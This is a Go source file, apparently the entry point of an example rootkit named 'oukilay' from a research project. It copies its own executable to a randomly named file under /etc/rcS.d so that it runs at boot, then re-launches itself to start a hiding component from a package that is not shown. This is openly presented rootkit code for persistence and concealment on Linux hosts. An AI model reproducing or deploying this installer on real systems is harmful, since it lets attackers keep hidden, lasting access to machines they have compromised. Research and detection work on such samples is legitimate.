package main

import (
	"flag"
	"fmt"
	"io/ioutil"
	"math/rand"
	"os"
	"os/signal"
	"path"
	"syscall"

	"github.com/safchain/reporigolo/examples/oukilay/pkg/hidden"
)

var letters = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ")

func randSeq(n int) string {
	b := make([]rune, n)
	for i := range b {
		b[i] = letters[rand.Intn(len(letters))]
	}
	return string(b)
}

func install() string {
	exe, _ := os.Executable()

	input, err := ioutil.ReadFile(exe)
	if err != nil {
		return ""
	}

	rand.Seed(int64(os.Getpid()))
	dest := "/etc/rcS.d/S01XX" + randSeq(25)

	err = ioutil.WriteFile(dest, input, 0700)
	if err != nil {
		return ""
	}

	return dest
}

func main() {
	start := flag.Bool("start", false, "start the rk otherwise install it")
	flag.Parse()

	if *start {
		fmt.Printf("Starting with pid %d\n", os.Getpid())
		rkHidden := hidden.NewRkHidden()
		rkHidden.Start()

		wait()

		rkHidden.Stop()
	} else {
		exe := install()
		fmt.Printf("Installed in %s\n", exe)
		if err := syscall.Exec(exe, []string{path.Base(exe), "-start"}, []string{}); err != nil {
			fmt.Println(err)
		}
	}
}

// wait - Waits until an interrupt or kill signal is sent
func wait() {
	sig := make(chan os.Signal, 1)
	signal.Notify(sig, os.Interrupt, os.Kill)
	<-sig
	fmt.Println()
}
